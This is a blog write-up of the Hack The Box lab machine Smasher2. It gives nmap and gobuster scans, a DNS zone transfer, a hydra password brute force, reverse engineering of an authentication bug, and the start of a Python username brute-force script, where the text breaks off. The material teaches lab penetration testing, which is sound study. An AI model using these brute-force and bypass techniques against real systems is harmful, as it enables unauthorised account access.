<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Smasher2 - Hack The Box - hackcommander.io</title>
<meta name="description" content="Just its predecessor, Smasher2 is a very difficult box with reverse engineering and binary exploitation. Unfortunately, the initial step required some insane brute-forcing which took part of the fun out of this one for me. I solved the authentication bypass part using an unintended method: The code compares the password against the username instead of the password in the configuration file so by guessing the username I also had the password and could log in. I had to do some WAF evasion to get my payload uploaded and land a shell. Then the final part of the box is exploiting a kernel driver mmap handler to change the credential structure in memory of my current user to get root access.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Smasher2 - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-smasher2/">


  <meta property="og:description" content="Just its predecessor, Smasher2 is a very difficult box with reverse engineering and binary exploitation. Unfortunately, the initial step required some insane brute-forcing which took part of the fun out of this one for me. I solved the authentication bypass part using an unintended method: The code compares the password against the username instead of the password in the configuration file so by guessing the username I also had the password and could log in. I had to do some WAF evasion to get my payload uploaded and land a shell. Then the final part of the box is exploiting a kernel driver mmap handler to change the credential structure in memory of my current user to get root access.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-smasher2/smasher2_logo.png">





  <meta property="article:published_time" content="2019-12-14T00:00:00+01:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-smasher2/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Smasher2 - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/ivÃ¡n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Smasher2 - Hack The Box">
    <meta itemprop="description" content="Just its predecessor, Smasher2 is a very difficult box with reverse engineering and binary exploitation. Unfortunately, the initial step required some insane brute-forcing which took part of the fun out of this one for me. I solved the authentication bypass part using an unintended method: The code compares the password against the username instead of the password in the configuration file so by guessing the username I also had the password and could log in. I had to do some WAF evasion to get my payload uploaded and land a shell. Then the final part of the box is exploiting a kernel driver mmap handler to change the credential structure in memory of my current user to get root access.">
    <meta itemprop="datePublished" content="December 14, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Smasher2 - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-12-14T00:00:00+01:00">December 14, 2019 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-smasher2/smasher2_logo.png" alt="" /></p>

<p>Just its predecessor, Smasher2 is a very difficult box with reverse engineering and binary exploitation. Unfortunately, the initial step required some insane brute-forcing which took part of the fun out of this one for me. I solved the authentication bypass part using an unintended method: The code compares the password against the username instead of the password in the configuration file so by guessing the username I also had the password and could log in. I had to do some WAF evasion to get my payload uploaded and land a shell. Then the final part of the box is exploiting a kernel driver mmap handler to change the credential structure in memory of my current user to get root access.</p>

<p>Overcast was the first one to find the intended way to solve the authentication bypass. He posted an excellent writeup about it here and I recommend you check it out: <a href="https://www.justinoblak.com/2019/10/01/hack-the-box-smasher2.html">https://www.justinoblak.com/2019/10/01/hack-the-box-smasher2.html</a></p>

<h2 id="summary">Summary</h2>

<ul>
  <li>We can do a zone transfer to find the <code class="language-plaintext highlighter-rouge">wonderfulsessionmanager.smasher2.htb</code> sub-domain.</li>
  <li>The domain has a simple generic website with a login form running on Python Flask.</li>
  <li>On the main website thereâs a <code class="language-plaintext highlighter-rouge">/backup</code> directory that is protected by HTTP basic authentication and contains the source code of the web application running on the machine</li>
  <li>The unintended way to bypass the authentication of the web app is to review the source code, run the <code class="language-plaintext highlighter-rouge">auth.py</code> with the shared library locally and identify that the supplied password is being checked against the username (instead of the password). Then itâs just a matter of bruteforcing usernames until we find that we can log in with <code class="language-plaintext highlighter-rouge">Administrator / Administrator</code> and get an API key.</li>
  <li>Once we have an API key, we have to defeat a WAF to gain RCE on the system.</li>
  <li>After getting a shell, we find a custom kernel module that is vulnerable to memory mapping issues.</li>
  <li>Using the discovered vulnerability, we can modify the credentials memory structure of our user and change it so we have root privileges.</li>
</ul>

<h2 id="blogs-used">Blogs used</h2>

<ul>
  <li><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf">Kernel Driver mmap Handler Exploitation</a></li>
</ul>

<h2 id="portscan">Portscan</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.135
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-04 23:23 EDT
Nmap scan report for smasher2.htb (10.10.10.135)
Host is up (0.023s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)
|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)
|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="port-80-website-enumeration">Port 80 website enumeration</h2>

<p>The web server displays the default Ubuntu apache page:</p>

<p><img src="/assets/images/htb-writeup-smasher2/apache.png" alt="" /></p>

<p>When running gobuster I found an interesting <code class="language-plaintext highlighter-rouge">/backup</code> directory but itâs protected by HTTP basic authentication.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -w raft-large-words-lowercase.txt -t 25 -u http://10.10.10.135 -s 200,204,301,302,307,401
/backup (Status: 401)
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-smasher2/backup1.png" alt="" /></p>

<p>I tried a few different credentials but I wasnât able to get in.</p>

<h2 id="dns-zone-transfer">DNS zone transfer</h2>

<p>In the portscan I saw that DNS was listening so I thought of doing a zone transfer to see if there are any sub-domains/vhosts. I found the <code class="language-plaintext highlighter-rouge">wonderfulsessionmanager.smasher2.htb</code> sub-domain by doing a zone transfer:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># host -t axfr smasher2.htb 10.10.10.135
Trying "smasher2.htb"
Using domain server:
Name: 10.10.10.135
Address: 10.10.10.135#53
Aliases: 

;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 8130
;; flags: qr aa; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;smasher2.htb.			IN	AXFR

;; ANSWER SECTION:
smasher2.htb.		604800	IN	SOA	smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
smasher2.htb.		604800	IN	NS	smasher2.htb.
smasher2.htb.		604800	IN	A	127.0.0.1
smasher2.htb.		604800	IN	AAAA	::1
smasher2.htb.		604800	IN	PTR	wonderfulsessionmanager.smasher2.htb.
smasher2.htb.		604800	IN	SOA	smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
</code></pre></div></div>

<h2 id="enumerating-wonderfulsessionmanagersmasher2htb">Enumerating wonderfulsessionmanager.smasher2.htb</h2>

<p>On the <code class="language-plaintext highlighter-rouge">wonderfulsessionmanager.smasher2.htb</code> vhost I found a website for the DZONERZY Session Manager.</p>

<p><img src="/assets/images/htb-writeup-smasher2/dsm1.png" alt="" /></p>

<p>Thereâs isnât much on the site except a login form at <code class="language-plaintext highlighter-rouge">/login</code>:</p>

<p><img src="/assets/images/htb-writeup-smasher2/dsm2.png" alt="" /></p>

<p>I tried a few random default credentials but I wasnât able to log in. As shown here, the login result comes in a JSON format:</p>

<p><img src="/assets/images/htb-writeup-smasher2/dsm3.png" alt="" /></p>

<p>Also, there is a <code class="language-plaintext highlighter-rouge">session</code> Cookie returned by the server:</p>

<p><code class="language-plaintext highlighter-rouge">eyJpZCI6eyIgYiI6IllUUXhaVFk1WlRGbVpXVmhaVEF4WldRNU1HSTBZekUwTlRoaE5UVXlOalprT0RJNFpXUXdNZz09In19.XPcIkQ.R6SdddxAKkm8zMC-SPtaIlO-MGM</code></p>

<p>That decodes to <code class="language-plaintext highlighter-rouge">{"id":{" b":"YTQxZTY5ZTFmZWVhZTAxZWQ5MGI0YzE0NThhNTUyNjZkODI4ZWQwMg=="}}</code> plus the signature.</p>

<p>If we had the shared secret key we could probably craft our own arbitrary token but I donât see anything that would allow us to change privileges, unlike for example JWT tokens with an <code class="language-plaintext highlighter-rouge">admin=0</code> that we can change to <code class="language-plaintext highlighter-rouge">admin=1</code> after bruteforcing the shared secret.</p>

<h2 id="bruteforcing-the-backup-directory">Bruteforcing the backup directory</h2>

<p>After spending some time trying to find a vulnerability on the login page, I went back to the <code class="language-plaintext highlighter-rouge">/backup</code> folder I had found on the website with the IP address. I tried a few different wordlists without any luck. Since I didnât have the username, I had to guess it was either something generic like <code class="language-plaintext highlighter-rouge">admin</code> or any of the top usernames, or some combination of the 3 different names on the website:</p>

<p><img src="/assets/images/htb-writeup-smasher2/dsm4.png" alt="" /></p>

<p>I built a wordlist with the following usernames:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin
backup
dev
temp
backup
Ally
Sanders
Robert
Anderson
John
McAffrey
asanders
randerson
jmcaffrey
ally
sanders
robert
anderson
john
mcaffrey
andersonr
sandersa
mcaffreyj
john.mcaffrey
robert.anderson
ally.sanders
</code></pre></div></div>

<p>Unfortunately not of them worked. By that time, a lot of people in the Mattermost HTB chat were stuck in the same place and the box creator dropped a hint that we had to use <strong>the full rockyou.txt</strong> wordlist and start at the letter c. He also mentioned that the username was <code class="language-plaintext highlighter-rouge">admin</code>. I donât know how this part of the box got past the HTB testers since heavy bruteforcing is normally not allowed (I think the box later got patched and that basic auth part was removed). To put this into perspective, even when knowing the username and the start letter, weâre looking at potentially ~640k passwords in rockyou.txt:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># egrep "^c.*" /usr/share/wordlists/rockyou.txt &gt; wordlist.txt
root@ragingunicorn:~/htb/smasher2# wc -l wordlist.txt 
639676 wordlist.txt
</code></pre></div></div>

<p>In my opinion, this is way over the top since the full rockyou list has 14M+ entries and itâs not possible to brute force an HTTP basic auth in a reasonable amount of time when we donât even know the username. Anyways, it still took me ~40 minutes to find the password when running 32 threads in hydra:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hydra -l admin -P wordlist.txt 10.10.10.135 -t 32 http-get /backup
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-05 00:24:55
[DATA] max 32 tasks per 1 server, overall 32 tasks, 639677 login tries (l:1/p:639677), ~19990 tries per task
[DATA] attacking http-get://10.10.10.135:80/backup
[STATUS] 7725.00 tries/min, 7725 tries in 00:01h, 631952 to do in 01:22h, 32 active
[STATUS] 7830.67 tries/min, 23492 tries in 00:03h, 616185 to do in 01:19h, 32 active
[STATUS] 7795.57 tries/min, 54569 tries in 00:07h, 585108 to do in 01:16h, 32 active
[STATUS] 7838.53 tries/min, 117578 tries in 00:15h, 522099 to do in 01:07h, 32 active
[STATUS] 7856.03 tries/min, 243537 tries in 00:31h, 396140 to do in 00:51h, 32 active
[80][http-get] host: 10.10.10.135   login: admin   password: clarabibi
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-05 01:05:21
</code></pre></div></div>

<p>Password: <code class="language-plaintext highlighter-rouge">clarabibi</code></p>

<p>I checked if that password was present in any other wordlist from SecLists, including the reduced rockyou list but I didnât find it there. Itâs only in the full rockyou list:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># grep -ri clarabibi /usr/share/seclists/
root@ragingunicorn:~# grep -ri clarabibi /usr/share/wordlists/rockyou.txt 
clarabibi
</code></pre></div></div>

<p>Ok, rant over.</p>

<p>Once I had the password, I checked out the <code class="language-plaintext highlighter-rouge">/backup</code> and found the source code for the authentication page on <code class="language-plaintext highlighter-rouge">wonderfulsessionmanager.smasher2.htb</code></p>

<p><img src="/assets/images/htb-writeup-smasher2/backup2.png" alt="" /></p>

<h2 id="bypassing-the-login-prompt-unintended-method">Bypassing the login prompt (unintended method)</h2>

<p>The <code class="language-plaintext highlighter-rouge">auth.py</code> file is a Python Flask application that implements a few endpoints:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/login</code> presents the HTML page for logging in</li>
</ul>

<p><img src="/assets/images/htb-writeup-smasher2/code1.png" alt="" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/auth</code> handles the AJAX request from the login page</li>
</ul>

<p><img src="/assets/images/htb-writeup-smasher2/code2.png" alt="" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/assets</code> serves static content such as images</li>
</ul>

<p><img src="/assets/images/htb-writeup-smasher2/code3.png" alt="" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/api</code> clearly contains an RCE vector through the <code class="language-plaintext highlighter-rouge">subprocess</code> function, but it expects a key which is provided after logging in</li>
</ul>

<p><img src="/assets/images/htb-writeup-smasher2/code4.png" alt="" /></p>

<p>Unfortunately, the username and password have been scrubbed from the source file backup:</p>

<p><img src="/assets/images/htb-writeup-smasher2/code5.png" alt="" /></p>

<p>The code also uses the custom <code class="language-plaintext highlighter-rouge">ses</code> module but itâs implemented through the <code class="language-plaintext highlighter-rouge">ses.so</code> shared object library so I donât have an easy python source code to review.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># file ses.so
ses.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,
BuildID[sha1]=0c67d40b77854318b10417b4aedfee95a52f0550, not stripped
</code></pre></div></div>

<p>To load the <code class="language-plaintext highlighter-rouge">ses.so</code> file in my Python code, I used the following <code class="language-plaintext highlighter-rouge">ses.py</code> snippet of code I found online:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">__bootstrap__</span><span class="p">():</span>
   <span class="k">global</span> <span class="n">__bootstrap__</span><span class="p">,</span> <span class="n">__loader__</span><span class="p">,</span> <span class="n">__file__</span>
   <span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">pkg_resources</span><span class="p">,</span> <span class="n">imp</span>
   <span class="n">__file__</span> <span class="o">=</span> <span class="n">pkg_resources</span><span class="p">.</span><span class="n">resource_filename</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span><span class="s">'ses.so'</span><span class="p">)</span>
   <span class="n">__loader__</span> <span class="o">=</span> <span class="bp">None</span><span class="p">;</span> <span class="k">del</span> <span class="n">__bootstrap__</span><span class="p">,</span> <span class="n">__loader__</span>
   <span class="n">imp</span><span class="p">.</span><span class="n">load_dynamic</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span><span class="n">__file__</span><span class="p">)</span>
<span class="n">__bootstrap__</span><span class="p">()</span>
</code></pre></div></div>

<p>Then I used a skeleton code to load create a SessionManager object:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">ses</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="k">def</span> <span class="nf">craft_secure_token</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">"HMACSecureKey123!"</span><span class="p">,</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">content</span><span class="p">).</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="n">login</span> <span class="o">=</span> <span class="p">[</span><span class="s">"snowscan"</span><span class="p">,</span> <span class="s">"yolo1234"</span><span class="p">]</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">ses</span><span class="p">.</span><span class="n">SessionManager</span><span class="p">(</span><span class="n">login</span><span class="p">,</span> <span class="n">craft_secure_token</span><span class="p">(</span><span class="s">":"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">login</span><span class="p">)))</span>
</code></pre></div></div>

<p>I experimented in the interactive interpreter a bit to list the different methods available for this object:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; s = ses.SessionManager(login, craft_secure_token(":".join(login)))
&gt;&gt;&gt; dir(s)
['__doc__', '__init__', '__module__', 'blocked', 'check_login', 'inc_login_count', 'last_login',
 'login_count', 'rst_login_count', 'secret_key', 'time_module', 'user_login']
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">secret_key</code> property is created by the <code class="language-plaintext highlighter-rouge">craft_secure_token</code> function and it contains the API key that needs to be applied to access the <code class="language-plaintext highlighter-rouge">/api</code> endpoint:</p>

<p>In this case, the key is created by the HMAC of the login and password I put in my skeleton code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">craft_secure_token</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">"HMACSecureKey123!"</span><span class="p">,</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">content</span><span class="p">).</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="p">...</span>
<span class="n">Managers</span><span class="p">.</span><span class="n">update</span><span class="p">({</span><span class="nb">id</span><span class="p">:</span> <span class="n">ses</span><span class="p">.</span><span class="n">SessionManager</span><span class="p">(</span><span class="n">login</span><span class="p">,</span> <span class="n">craft_secure_token</span><span class="p">(</span><span class="s">":"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">login</span><span class="p">)))})</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; s.secret_key
'd781058ac21c2d30abc660e1c8d9c91e8f615ff1713a0d496b4153540be796d8'
</code></pre></div></div>

<p>Thereâs a couple of method and properties to manage login count and lockout, but the most interesting method I checked after was <code class="language-plaintext highlighter-rouge">check_login</code>. Based on the <code class="language-plaintext highlighter-rouge">auth.py</code> source code, it expects a dictionnary with a <code class="language-plaintext highlighter-rouge">data</code> key that contains another dictionnary with both <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> as keys.</p>

<p>I tested the <code class="language-plaintext highlighter-rouge">check_login</code> function a few times but it always returned a False result even when I put the right credentials:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; login = ["snowscan", "yolo1234"]
&gt;&gt;&gt; s = ses.SessionManager(login, craft_secure_token(":".join(login)))
&gt;&gt;&gt; d = { 
...     "data": {
...         "username": "snowscan",
...         "password": "yolo1234"
...     }
... }
&gt;&gt;&gt; 
&gt;&gt;&gt; s.check_login(d)
[False, {'username': 'snowscan', 'password': 'yolo1234'}]
</code></pre></div></div>

<p>To see what is going on with the module, I started GDB after I launched by Python interactive interpreter and just attached to the Python PID:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ps -ef | grep python
root      33226   2076  0 01:04 pts/1    00:00:00 python

# gdb -p 33226
GNU gdb (Debian 8.2.1-2) 8.2.1
</code></pre></div></div>

<p>I tried checking the functions with <code class="language-plaintext highlighter-rouge">info func</code> but since the program is already running, it shows all libc functions and others that are loaded. Way too much stuff displayedâ¦ My gdb skills suck so I used Ghidra to check the program functions:</p>

<p><img src="/assets/images/htb-writeup-smasher2/ghidra1.png" alt="" /></p>

<p>Only 4 functions shown for SessionManager:</p>

<ul>
  <li>SessionManager_check_login</li>
  <li>SessionManager_init_login_count</li>
  <li>SessionManager_init</li>
  <li>SessionManager_rst_login_count</li>
</ul>

<p>In <code class="language-plaintext highlighter-rouge">SessionManager_check_login</code>, I can see the code does two <code class="language-plaintext highlighter-rouge">strcmp</code> calls to check the username and password:</p>

<p><img src="/assets/images/htb-writeup-smasher2/ghidra2.png" alt="" /></p>

<p>I put a breakpoint in GDB at the <code class="language-plaintext highlighter-rouge">SessionManager_check_login</code> function call and traced its execution.</p>

<p>First, thereâs a <code class="language-plaintext highlighter-rouge">strcmp</code> for the username:</p>

<p><img src="/assets/images/htb-writeup-smasher2/gdb.png" alt="" /></p>

<p>Then on the next <code class="language-plaintext highlighter-rouge">strcmp</code> for the password thereâs something really strangeâ¦</p>

<p><img src="/assets/images/htb-writeup-smasher2/gdb2.png" alt="" /></p>

<p>Itâs comparing the supplied password against the username. Wow, thatâs a pretty bad bug! So if I just brute force the usernames and I find a valid one I will be able to login by using it as the password.</p>

<p>To brute force the username, I wrote the script below but had to factor in some error handling whenever I would get a 403 message for some usernames with invalid characters. Sometimes I would also get some false positive, plus the box also dies after ~300 login attempts so I had to reset quite a few times before I figured out the right wordlist.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"http"</span><span class="p">:</span> <span class="s">"http://127.0.0.1:8080"</span>
<span class="p">}</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://wonderfulsessionmanager.smasher2.htb/auth"</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">,</span>
    <span class="s">"X-Requested-With"</span><span class="p">:</span> <span class="s">"XMLHttpRequest"</span><span class="p">,</span>

<span class="p">}</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"userlist3.txt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">passwords</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">bad</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">bad</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://wonderfulsessionmanager.smasher2.htb/login"</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"GET FAILED!"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s">'{"action":"auth","data":{"username":"%s","password":"%s"}}'</span> <span class="o">%</span> <span class="p">(</span><span class="n">passwords</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">passwords</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Testing username: %s"</span> <span class="o">%</span> <span class="n">passwords</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">403</span><span class="p">:</span>
            <span class="n">bad</span> <span class="o">=</span> <span class="n">bad</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="n">bad</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
